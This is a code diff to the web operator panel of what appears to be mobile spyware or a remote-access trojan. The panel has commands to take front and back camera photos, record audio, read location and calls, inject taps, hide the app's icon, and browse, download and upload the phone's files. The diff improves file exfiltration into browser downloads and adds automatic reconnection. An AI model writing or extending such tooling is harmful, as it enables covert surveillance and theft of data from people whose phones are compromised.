@@ -27,8 +27,11 @@
   #cam-img { width:100%; background:#000; border:1px solid var(--line); margin-top:6px; }
   #notifs { max-height:250px; overflow:auto; font-size:13px; }
   .notif { padding:6px 0; border-bottom:1px dashed var(--line); }
+  .file-item { padding:8px; border-bottom:1px solid var(--line); display:flex; justify-content:space-between; align-items:center; cursor:pointer; }
+  .file-item:active { background:#1a2b1a; }
+  .file-name { font-weight:bold; }
+  .file-size { font-size:11px; color:var(--dim); }
   
-  /* Desktop layout */
   @media (min-width: 768px) {
     main { display:grid; grid-template-columns: repeat(2, 1fr); }
     .row { flex-direction:row; flex-wrap:wrap; }
@@ -115,8 +118,9 @@
     </div>
     <div class="row">
       <button id="btn-ls">List</button>
-      <button id="btn-dl">Download (b64)</button>
+      <button id="btn-dl">Download File</button>
     </div>
+    <div id="file-list" style="max-height:300px; overflow:auto; margin-bottom:10px; border:1px solid var(--line); background:#0d130d;"></div>
     <div class="row">
       <input id="upload" type="file" style="color:var(--fg)">
       <button id="btn-ul">Upload</button>
@@ -165,7 +169,7 @@ async function connect() {
   try {
     const r = await api('get_device_info');
     if (r.ok) { renderTelemetry(r.data); setLed(true); }
-    else { setLed(false); alert('device offline: ' + (r.error || '')); return; }
+    else { setLed(false); alert('device offline (sleeping?): ' + (r.error || '')); return; }
   } catch (e) { setLed(false); alert('connect failed: ' + e.message); return; }
   openWs(server, psk);
 }
@@ -181,6 +185,7 @@ function openWs(server, psk) {
   ws.onmessage = ev => { try { handlePush(JSON.parse(ev.data)); } catch (_) {} };
   ws.onclose = () => {
     setLed(false);
+    $('status').textContent = 'reconnecting...';
     const p = sessionStorage.getItem('psk'), s = sessionStorage.getItem('server');
     if (p && s) setTimeout(() => openWs(s, p), 3000);
   };
@@ -256,6 +261,7 @@ function renderTelemetry(t) {
   }
 }
 
+// UI Bindings
 $('connect').onclick = connect;
 $('refresh-telemetry').onclick = async () => {
   try { const r = await api('get_device_info'); if (r.ok) renderTelemetry(r.data); } catch (e) { alert(e.message); }
@@ -273,16 +279,6 @@ $('btn-calls').onclick = async () => {
 $('btn-location').onclick = async () => {
   try { const r = await api('get_location');
     $('extract-out').textContent = r.ok ? JSON.stringify(r.data, null, 2) : ('error: ' + r.error);
-  } catch (e) { alert(e.message); }
-};
-$('btn-front-cam').onclick = async () => {
-  try { const r = await api('take_camera_photo', { facing: 'front' });
-    if (r.ok) $('cam-img').src = 'data:image/jpeg;base64,' + r.data.jpeg_b64; else alert(r.error);
-  } catch (e) { alert(e.message); }
-};
-$('btn-back-cam').onclick = async () => {
-  try { const r = await api('take_camera_photo', { facing: 'back' });
-    if (r.ok) $('cam-img').src = 'data:image/jpeg;base64,' + r.data.jpeg_b64; else alert(r.error);
   } catch (e) { alert(e.message); }
 };
 
@@ -312,6 +308,16 @@ $('btn-audio').onclick = async () => {
     }
   } catch (e) { alert(e.message); }
 };
+$('btn-front-cam').onclick = async () => {
+  try { const r = await api('take_camera_photo', { facing: 'front' });
+    if (r.ok) $('cam-img').src = 'data:image/jpeg;base64,' + r.data.jpeg_b64; else alert(r.error);
+  } catch (e) { alert(e.message); }
+};
+$('btn-back-cam').onclick = async () => {
+  try { const r = await api('take_camera_photo', { facing: 'back' });
+    if (r.ok) $('cam-img').src = 'data:image/jpeg;base64,' + r.data.jpeg_b64; else alert(r.error);
+  } catch (e) { alert(e.message); }
+};
 $('btn-tap').onclick = async () => {
   try {
     const r = await api('tap', { x: parseFloat($('tap-x').value), y: parseFloat($('tap-y').value) });
@@ -334,17 +340,53 @@ $('btn-hide').onclick = async () => {
 $('btn-unhide').onclick = async () => {
   try { const r = await api('unhide_icon'); if (!r.ok) alert(r.error); } catch (e) { alert(e.message); }
 };
+
 $('btn-ls').onclick = async () => {
-  try { const r = await api('list_dir', { path: $('file-path').value });
-    $('files-out').textContent = r.ok ? JSON.stringify(r.data, null, 2) : ('error: ' + r.error);
+  try { 
+    const r = await api('list_dir', { path: $('file-path').value });
+    const list = $('file-list');
+    list.innerHTML = '';
+    if (r.ok) {
+      r.data.entries.forEach(f => {
+        const div = document.createElement('div');
+        div.className = 'file-item';
+        div.innerHTML = `<span class="file-name">${f.name}</span><span class="file-size">${f.dir ? 'Folder' : (f.size/1024).toFixed(1)+' KB'}</span>`;
+        div.onclick = () => {
+          $('file-path').value = f.path;
+          if (f.dir) { $('btn-ls').click(); }
+        };
+        list.appendChild(div);
+      });
+    } else {
+      $('files-out').textContent = 'error: ' + r.error;
+    }
   } catch (e) { alert(e.message); }
 };
+
 $('btn-dl').onclick = async () => {
-  try { const r = await api('download_file', { path: $('file-path').value });
-    if (r.ok) $('files-out').textContent = 'base64 (' + r.data.size + ' bytes): ' + r.data.b64.slice(0, 200) + '…';
-    else $('files-out').textContent = 'error: ' + r.error;
+  try { 
+    const r = await api('download_file', { path: $('file-path').value });
+    if (r.ok) {
+      const b64 = r.data.b64;
+      const bin = atob(b64);
+      const bytes = new Uint8Array(bin.length);
+      for (let i = 0; i < bin.length; i++) bytes[i] = bin.charCodeAt(i);
+      const blob = new Blob([bytes], { type: 'application/octet-stream' });
+      const url = URL.createObjectURL(blob);
+      const a = document.createElement('a');
+      a.href = url;
+      a.download = $('file-path').value.split('/').pop() || 'download.bin';
+      document.body.appendChild(a);
+      a.click();
+      document.body.removeChild(a);
+      URL.revokeObjectURL(url);
+      $('files-out').textContent = 'Downloaded file successfully.';
+    } else {
+      $('files-out').textContent = 'error: ' + r.error;
+    }
   } catch (e) { alert(e.message); }
 };
+
 $('btn-ul').onclick = async () => {
   try {
     const inp = $('upload');
